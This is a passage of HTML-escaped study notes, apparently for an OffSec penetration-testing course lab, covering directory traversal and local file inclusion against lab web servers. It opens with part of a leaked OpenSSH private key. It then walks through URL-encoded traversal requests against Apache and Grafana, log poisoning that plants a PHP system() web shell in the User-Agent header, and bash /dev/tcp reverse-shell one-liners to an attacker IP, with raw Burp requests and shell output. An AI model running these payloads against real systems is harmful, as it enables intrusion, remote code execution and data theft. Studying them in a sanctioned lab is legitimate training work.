+AMEApFepwCJdUtlYZr7J8vumuXerNynUf7wLywKGr1o9bzIJQtUFjYn6FObn5rdBDp/9+t
+qi3F+WEKwRlLelPR7H6EZLKG7EpDjLbMFA1y2p2qNHVWeOVa5CQ+VuD6uc7vSvfwgPysqT
+vAth1IhrkKRuAaT0HuGY80coNxOr7tID9F0b0GuRCuEtCWE/+O5434mW/DvVHkdrnhgG1S
+fc/+OdpGNYtLxvTqBql0CVInGBTatqvtYtj43Vr5VfZWL+tKGOAAAAwQDvXu2fi1Fb9fID
+1bDU+7mJ9r2XXIIqioCyp42LKIh4VZeYX8SlD3H6X1clZ3XwdGymxznfIZJO/0d964BDmA
+fKme7iyscVx0NDMhYHkaLWr7X3RYdp2d9WylKt3bOaMDyDnINIbmt9FVBDkmFDoK+GMUvW
+mEtAhw1cUhuVVsvXTXYsMC2cn6YPPpEMXTzpsU+q0LUGSmG/XaaK9gjQOTFIY6tgC33IPO
+lpWPWFQro9wzJ/uJsw/lepsqjrg2UvtrkAAADBAN5b6pbAdNmsQYmOIh8XALkNHwSusaK8
+bM225OyFIxS+BLieT7iByDK4HwBmdExod29fFPwG/6mXUL2Dcjb6zKJl7AGiyqm5+0Ju5e
+hDmrXeGZGg/5unGXiNtsoTJIfVjhM55Q7OUQ9NSklONUOgaTa6dyUYGqaynvUVJ/XxpBrb
+iRdp0z8X8E5NZxhHnarkQE2ZHyVTSf89NudDoXiWQXcadkyrIXxLofHPrQzPck2HvWhZVA
++2iMijw3FvY/Fp4QAAAA1vZmZzZWNAb2Zmc2VjAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+
+    &amp;lt;script&amp;gt;window.jQuery || document.write(&amp;#39;&amp;lt;script src=&amp;quot;js/vendor/jquery-1.11.2.min.js&amp;quot;&amp;gt;&amp;lt;\/script&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt;
+...
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Save key, set perms, connect to host:&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ chmod 400 dt_rsa                                 
+                                                                             
+┌──(kali㉿kali)-[~]
+└─$ ssh -i dt_rsa offsec@mountaindesserts.com -p 2222
+Linux 5dfafd5c3dc3 5.4.0-132-generic #148-Ubuntu SMP Mon Oct 17 16:02:06 UTC 2022 x86_64
+OS{e3c6e63e6ae0a07c39ae1faece6ae237}
+offsec@5dfafd5c3dc3:~$ whoami
+offsec
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Grafana Windows Path traversal&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is http://192.168.235.193:3000/public/plugins/alertlist/../../../../../../../../Users/install.txt
+OS{40fc8290aa5efda3d0a1c3eb5615dfac}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;ul&gt;
+&lt;li&gt;*.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Encoding Special Characters&lt;/h6&gt;
+&lt;ul&gt;
+&lt;li&gt;In the &amp;quot;Vulnerability Scanning&amp;quot; topic, we scanned the SAMBA machine and identified a directory traversal vulnerability in Apache 2.4.49.1 This vulnerability can be exploited by using a relative path after specifying the cgi-bin directory in the URL.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../etc/passwd
+
+&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The requested URL was not found on this server.&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+
+
+kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/../../../../../../../../../../etc/passwd
+
+&amp;lt;!DOCTYPE HTML PUBLIC &amp;quot;-//IETF//DTD HTML 2.0//EN&amp;quot;&amp;gt;
+&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;
+&amp;lt;title&amp;gt;404 Not Found&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;
+&amp;lt;h1&amp;gt;Not Found&amp;lt;/h1&amp;gt;
+&amp;lt;p&amp;gt;The requested URL was not found on this server.&amp;lt;/p&amp;gt;
+&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Demonstrates that after attempting two queries with a different number of &lt;code&gt;../&lt;/code&gt;, we could not display the contents of &lt;code&gt;/etc/passwd&lt;/code&gt; via directory traversal.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Leveraging &lt;code&gt;../&lt;/code&gt; is a known way to abuse web application behavior.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;This sequence is often filtered by either the web server, web application firewalls, or the web application itself.&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Fortunately for us, we can use URL Encoding, also called Percent Encoding, to potentially bypass these filters.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;We can leverage specific ASCII encoding lists4 to manually encode our query from listing 11 or use the online converter on the same page.&lt;/li&gt;
+&lt;li&gt;For now, we will only encode the dots, which are represented as &lt;code&gt;%2e&lt;/code&gt;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;kali@kali:/var/www/html$ curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+...
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+alfred:x:1000:1000::/home/alfred:/bin/bash
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Successfully used directory traversal with encoded dots to display the contents of &lt;code&gt;/etc/passwd&lt;/code&gt; on the target machine.&lt;/li&gt;
+&lt;li&gt;URL encoding is used to convert characters of a web request into a format that can be transmitted over the internet.&lt;/li&gt;
+&lt;li&gt;It is also a popular method used for malicious purposes.&lt;/li&gt;
+&lt;li&gt;Reason for this is that the encoded representation of characters in a request may be missed by filters.&lt;ul&gt;
+&lt;li&gt;Which only check for the plain-text representation of them e.g. &lt;code&gt;../&lt;/code&gt; but not &lt;code&gt;%2e%2e/&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;After the request passes the filter, the web application or server interprets the encoded characters as a valid request.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;ul&gt;
+&lt;li&gt;*.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h6&gt;Encoding Special Characters Exercises&lt;/h6&gt;
+&lt;p&gt;&lt;strong&gt;Apache cgi-bin path traversal with URL encoding&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is http://192.168.235.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/passwords
+OS{4fc96513e5471612d0846a523a8d199e}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;&lt;strong&gt;Grafana with URL encoding&lt;/strong&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+grafana:x:472:0::/home/grafana:/usr/sbin/nologin
+
+┌──(kali㉿kali)-[~]
+└─$ curl --path-as-is http://192.168.235.16:3000/public/plugins/alertlist/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/opt/install.txt
+OS{8267caf26dc5b6bb3876c10b9d8c28ef}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;ul&gt;
+&lt;li&gt;*.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h5&gt;9.2 File Inclusion Vulnerabilities&lt;/h5&gt;
+&lt;pre&gt;&lt;code&gt;    Learn the difference between File Inclusion and Directory Traversal vulnerabilities 
+    ```
+    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Gain an understanding of File Inclusion vulnerabilities 
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;    Understand how to leverage Local File Inclusion (LFI) to obtain code Execution 
+    ```
+    
+- ```
+    Explore PHP wrapper usage 
+
+    ```
+    
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;Learn how to perform Remote File Inclusion (RFI) attacks 
+
+```
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4&gt;Local File Inclusion (LFI)&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;p&gt;Local File Inclusion (LFI) vs Directory Traversal.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Often mixed up by pen testers.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Traversal&lt;/strong&gt; allows us to obtain the contents of a file outside of web root.&lt;ul&gt;
+&lt;li&gt;The source of &lt;code&gt;admin.php&lt;/code&gt; would be displayed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;File Inclusion&lt;/strong&gt; allows us to include a file in the apps running code.&lt;ul&gt;
+&lt;li&gt;The file &lt;code&gt;admin.php&lt;/code&gt; would be executed.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;p&gt;Local File Inclusion (LFI) techniques can be chained with other bugs to deliver remote code execution.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Can be used to exec local or remote files.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Example:&lt;/strong&gt; we can achieve RCE by leveraging LFI.&lt;ul&gt;
+&lt;li&gt;With the help of &lt;a href=&quot;https://owasp.org/www-community/attacks/Log_Injection&quot;&gt;Log Poisoning&lt;/a&gt;&lt;ul&gt;
+&lt;li&gt;Works by modifying the data we send to the web app so logs contain executable code.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;In an LFI vuln scenario, the local file we include is exec&amp;#39;d if it contains executable code.&lt;ul&gt;
+&lt;li&gt;I.e. - if we are able to write executable code to a file, include it in the running code, it will be exec&amp;#39;d.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The Apache &lt;code&gt;access.log&lt;/code&gt; in the &lt;code&gt;/var/log/apache2&lt;/code&gt; directory can be targeted if it is controlled by us and saved by Apache.&lt;ul&gt;
+&lt;li&gt;&amp;quot;controlled&amp;quot; means we can modify the data we are sending.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Use curl to analyze the elements that comprise a log entry.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;
+kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
+...
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] &amp;quot;GET /meteor/index.php?page=admin.php HTTP/1.1&amp;quot; 200 2218 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&amp;quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;As we see &lt;strong&gt;User Agent&lt;/strong&gt; is included in the log entry.&lt;ul&gt;
+&lt;li&gt;Before we send our request, we can modify it with Burp and specify what is written to the access log.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The command is equivalent to the Traversal attack, but differs when handling executable files/contents.&lt;/li&gt;
+&lt;li&gt;Modify the User Agent to include a PHP snippet for command execution on the server.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Once the snippet has been injected update the Traversal param to point at the access log.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../../../../../../../../var/log/apache2/access.log&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;We also need to enter a &lt;code&gt;cmd&lt;/code&gt; param for the PHP snippet to execute.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;&amp;amp;cmd=ls%20-ls&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Note the &lt;code&gt;%20&lt;/code&gt; URL encode in place of a &amp;quot; &amp;quot;.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Add param.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../../../../../../../../var/log/apache2/access.log&amp;amp;cmd=ls%20-ls&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The response will include the output of the executed command.&lt;ul&gt;
+&lt;li&gt;If we see successful output from the test command we can leverage this to further the attack.&lt;ul&gt;
+&lt;li&gt;Start a reverse shell.&lt;/li&gt;
+&lt;li&gt;Add our SSH key to authorized_keys of the user.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;To launch a reverse shell.&lt;ul&gt;
+&lt;li&gt;Common one liner.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.119.3/4444 0&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Keep in mind, it will likely be executed by &lt;code&gt;sh&lt;/code&gt; not &lt;code&gt;bash&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;Use &lt;code&gt;bash -c&lt;/code&gt; providing the one liner as an argument to invoke &lt;code&gt;bash&lt;/code&gt;&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.119.3/4444 0&amp;gt;&amp;amp;1&amp;quot;&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;URL encode the string before sending.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;The final URL param will look like:&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;../../../../../../../../../var/log/apache2/access.log&amp;amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Before launching, start out netcat listener on the attacking system.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;nc -nvlp 4444&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;&lt;strong&gt;Windows System LFI&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Differs from Linux when it comes to file paths and execution.&lt;/li&gt;
+&lt;li&gt;Log files in Win are located in app specific paths.&lt;ul&gt;
+&lt;li&gt;Example: on a target running &lt;code&gt;XAMPP&lt;/code&gt; logs will be found under &lt;code&gt;C:\xampp\apache\logs&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;PHP snipped shown will work on Win, also similar in other frameworks.&lt;ul&gt;
+&lt;li&gt;I.e. -.&lt;ul&gt;
+&lt;li&gt;&lt;a href=&quot;https://www.perl.org/&quot;&gt;Perl&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/ASP.NET&quot;&gt;Active Server Pages Extended&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Active_Server_Pages&quot;&gt;Active Server Pages&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Jakarta_Server_Pages&quot;&gt;Java Server Pages&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;Etc.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Consider an LFI vulnerability in a JSP web application.&lt;ul&gt;
+&lt;li&gt;If we can write JSP code to a file using Log Poisoning and include this file with the LFI vulnerability, the code will be executed.&lt;/li&gt;
+&lt;li&gt;The only difference between this example and the previous PHP demonstration is that the code snippet used for the Log Poisoning would be in a different language.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Modern frameworks and languages are often by design not vulnerable or have protection mechanisms enabled by default against LFI.&lt;ul&gt;
+&lt;li&gt;We should be aware that we can also find LFI vulnerabilities in modern back-end JavaScript runtime environments like &lt;a href=&quot;https://nodejs.org/en/&quot;&gt;Node.js&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h4&gt;Local File Inclusion (LFI) Exercises&lt;/h4&gt;
+&lt;p&gt;Leverage the LFI vulnerability in the web application (located at &lt;a href=&quot;http://mountaindesserts.com/meteor/&quot;&gt;http://mountaindesserts.com/meteor/&lt;/a&gt;) to receive a reverse shell on WEB18 (VM #1). Get the flag from the /home/ariella/flag.txt file. To display the contents of the file, check your sudo privileges with sudo -l and use them to read the flag.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Admin link.&lt;ul&gt;
+&lt;li&gt;Under maint &lt;code&gt;http://mountaindesserts.com/meteor/index.php?page=admin.php&lt;/code&gt;&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;page&lt;/code&gt; param used to open files, LFI may be possible.&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;http://mountaindesserts.com/meteor/admin.php&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Request sent to Burp.&lt;ul&gt;
+&lt;li&gt;Performed DT shown below, UA string written to Apache access log.&lt;/li&gt;
+&lt;li&gt;Prepare to inject PHP on-liner &lt;code&gt;&amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;&lt;/code&gt; in UA header.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;Modify user-agent in request with PHP one-line to write to log.&lt;/li&gt;
+&lt;li&gt;Spawn netcat reverse shell &lt;code&gt;&amp;#39;bash -c &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.45.198/4444 0&amp;gt;&amp;amp;1&amp;quot;&amp;#39;&lt;/code&gt; with enclosing single quote.&lt;ul&gt;
+&lt;li&gt;Urlencode &lt;code&gt;bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.198%2F4444%200%3E%261%22&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;
+### In Burp, sent req from HTTP hist to Repeater, OG req snip with admin page inclusion
+...
+&amp;lt;body&amp;gt;
+        &amp;lt;span style=&amp;quot;color:#F00;text-align:center;&amp;quot;&amp;gt;The admin page is currently under maintenance.
+//
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+...
+
+### Modified req with URL encoded DT string to Apache access log, user agent header logged to file
+
+GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+192.168.63.1 - - [12/Apr/2022:10:34:55 +0000] &amp;quot;GET /meteor/ HTTP/1.1&amp;quot; 200 2361 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36&amp;quot;
+192.168.50.1 - - [12/Apr/2022:10:34:55 +0000] &amp;quot;GET /meteor/index.php?page=admin.php HTTP/1.1&amp;quot; 200 2218 &amp;quot;-&amp;quot; &amp;quot;Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0&amp;quot;
+...
+
+### Inject PHP, supply ps as test command for LFI, success.
+
+GET /meteor/index.php?page=admin.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: &amp;lt;?php echo system($_GET[&amp;#39;cmd&amp;#39;]); ?&amp;gt;
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+&amp;lt;a href=&amp;quot;index.php?page=admin.php&amp;quot;&amp;gt;&amp;lt;p style=&amp;quot;text-align:center&amp;quot;&amp;gt;Admin&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;
+...
+192.168.45.198 - - [27/Aug/2023:16:57:05 +0000] &amp;quot;GET /meteor/index.php?page=admin.php HTTP/1.1&amp;quot; 200 2132 &amp;quot;http://mountaindesserts.com/meteor/index.php&amp;quot; &amp;quot;    PID TTY          TIME CMD
+     37 ?        00:00:00 apache2
+     38 ?        00:00:00 apache2
+     39 ?        00:00:00 apache2
+     40 ?        00:00:00 apache2
+     41 ?        00:00:00 apache2
+     47 ?        00:00:00 apache2
+     49 ?        00:00:00 apache2
+     50 ?        00:00:00 apache2
+     51 ?        00:00:00 apache2
+     52 ?        00:00:00 apache2
+     53 ?        00:00:00 sh
+     54 ?        00:00:00 ps
+     54 ?        00:00:00 ps&amp;quot;
+
+    &amp;lt;script&amp;gt;window.jQuery || document.write(&amp;#39;&amp;lt;script src=&amp;quot;js/vendor/jquery-1.11.2.min.js&amp;quot;&amp;gt;&amp;lt;\/script&amp;gt;&amp;#39;)&amp;lt;/script&amp;gt;
+...
+
+### Spawn netcat reverse shell
+
+$ nc -nvlp 4444
+
+### Spawn reverse shell (enclosing single quotes of URL encode important)
+
+GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flog%2Fapache2%2Faccess.log&amp;amp;cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.198%2F4444%200%3E%261%22 HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: 
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/index.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+┌──(kali㉿kali)-[~]
+└─$ sudo nc -nvlp 4444
+listening on [any] 4444 ...
+connect to [192.168.45.198] from (UNKNOWN) [192.168.246.16] 36958
+bash: cannot set terminal process group (35): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@2ebe30ebb935:/var/www/html/meteor$ whoami
+whoami
+www-data
+www-data@2ebe30ebb935:/var/www/html/meteor$ sudo -l
+sudo -l
+Matching Defaults entries for www-data on 2ebe30ebb935:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on 2ebe30ebb935:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+www-data@2ebe30ebb935:/var/www/html/meteor$ 
+
+### -------------------- FLAG -------------------- #
+
+www-data@2ebe30ebb935:/var/www/html/meteor$ sudo cat /home/ariella/flag.txt
+sudo cat /home/ariella/flag.txt
+OS{965fc8eb26256c952045acd438d25619}
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Exploit the LFI vulnerability in the web application &amp;quot;Mountain Desserts&amp;quot; on WEB18 (VM #2) (located at &lt;a href=&quot;http://mountaindesserts.com/meteor/&quot;&gt;http://mountaindesserts.com/meteor/&lt;/a&gt;) to execute the PHP /opt/admin.bak.php file with Burp or curl. Enter the flag from the output.&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;DT with explicit path/rel path below.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;
+### Exp
+
+GET /meteor/index.php?page=/opt/admin.bak.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+### Rel w/url encoding
+
+GET /meteor/index.php?page=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fopt%2Fadmin.bak.php HTTP/1.1
+Host: mountaindesserts.com
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://mountaindesserts.com/meteor/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Connection: close
+
+...
+&amp;lt;body&amp;gt;
